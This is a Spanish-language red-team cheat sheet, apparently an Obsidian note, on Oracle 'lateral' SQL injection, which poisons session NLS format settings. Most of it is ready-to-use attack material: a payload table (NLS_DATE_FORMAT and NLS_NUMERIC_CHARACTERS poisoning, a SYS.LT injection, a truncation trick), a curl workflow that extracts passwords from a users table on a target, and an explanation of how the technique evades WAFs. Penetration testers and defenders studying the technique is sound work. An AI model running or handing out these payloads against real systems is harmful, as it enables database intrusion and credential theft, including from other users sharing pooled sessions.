---
aliases:
  - Lateral SQL Injection
tags:
  - vuln/sqli
  - technique/execution
  - asset/database
  - asset/web-app
primary categories:
  - "[[Red Team]]"
secondary categories:
  - "[[Explotación|Explotación]]"
  - "[[Web]]"
tertiary categories:
  - "[[Web Explotación]]"
kind: SubCheatSheet
linked:
  - "[[SQL Injection (SQLi)]]"
---
# SQLi - Lateral (Oracle)

---

## Cheatsheet

| **Payload** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `ALTER SESSION SET NLS_DATE_FORMAT = '"'' AND 1=1--"'` | Modifica formato date a nivel session — payload latente | Pre-paso para envenenar `TO_CHAR(SYSDATE)`. |
| `ALTER SESSION SET NLS_DATE_FORMAT = '"'' UNION SELECT password FROM users--"'` | Payload UNION embebido en formato date | Una vez seteado, cualquier conversion DATE→string dispara. |
| `SELECT TO_CHAR(SYSDATE) FROM dual` (después de ALTER SESSION) | Detonator — al concatenar fecha, ejecuta el formato envenenado | Hay endpoint que llama `TO_CHAR` con session reusada. |
| `ALTER SESSION SET NLS_NUMERIC_CHARACTERS = '''' OR ''1''=''1''-- '` | Vector via formato numérico (NUMBER conversions) | App con queries que castean a/desde NUMBER. |
| `BEGIN SYS.LT.CREATEWORKSPACE('x'' AND 1=1--'); END;` | PL/SQL package vulnerable con SQL dinámico interno | Apps con SYS.LT (workspace mgmt) accesible. |
| Username `A` x 4000 + `' OR 1=1-- -` (truncamiento) | Buffer overflow lógico — comilla cierre original se trunca | App con VARCHAR2(4000) y concat sin sanitizar. |
| `BEGIN DBMS_OUTPUT.PUT_LINE((SELECT password FROM users WHERE rownum=1)); END;` | Output via DBMS_OUTPUT capturado en logs | Endpoint que lee buffer DBMS_OUTPUT después. |
^sqli-lateral

### Workflow

```bash
TARGET="https://target/api/items?id=1"

# 1. Confirmar backend Oracle
curl -s "$TARGET" | grep -iE 'ora-|oracle'
curl -s "$TARGET'" | grep -oE 'ORA-[0-9]+'

# 2. Setear NLS_DATE_FORMAT envenenado
PAYLOAD_1="'; BEGIN EXECUTE IMMEDIATE 'ALTER SESSION SET NLS_DATE_FORMAT = ''\"'''' UNION SELECT password,user FROM users--\"''' ; END;-- -"
curl -s "$TARGET$(python3 -c "import urllib.parse;print(urllib.parse.quote('$PAYLOAD_1'))")"

# 3. Triggerear endpoint que use TO_CHAR(SYSDATE)
# Ejemplos: /api/reports, /admin/audit, /search?date=today
curl -s "https://target/api/reports"  # debería reflejar el password ahora
```

### Por qué bypassa WAFs

```sql
-- WAF inspecciona la PRIMERA query — solo ve un ALTER SESSION:
ALTER SESSION SET NLS_DATE_FORMAT = '"'' AND 1=1--"'
-- WAF: "no es SELECT/UPDATE/INSERT, es config — allow"

-- DESPUÉS, endpoint legítimo hace:
SELECT TO_CHAR(SYSDATE) FROM dual
-- Oracle ahora interpreta SYSDATE usando el formato envenenado
-- → ejecuta el ' AND 1=1-- como código SQL en el contexto
```

---

## Overview

**Lateral SQLi** = vector Oracle-específico. En vez de inyectar en input string típico, envenenar **variables de sesión de Oracle** (`NLS_DATE_FORMAT`, `NLS_NUMERIC_CHARACTERS`). Cualquier conversion implícita o explícita posterior dispara el payload.

**Por qué es lateral:**
- Inyección no ocurre en la query atacada inicialmente.
- Payload "espera" en la session config.
- Detonator es otra query que aparenta ser segura (`TO_CHAR(SYSDATE)`).

**Bypassa:**
- WAFs que buscan patrones SQLi en queries normales.
- Validaciones de tipos rígidos (DATE/NUMBER) que asumen inmunidad.
- Sanitization de strings (el payload va en SET de config).

**Limitación:** session debe persistir entre primera query (poison) y segunda (detonator). Connection pooling con sessions persistentes amplifica esto — un atacante envenena, **otros usuarios** disparan.

Documentado por David Litchfield (2008) — más teórico que común, pero severo cuando aplica.

---
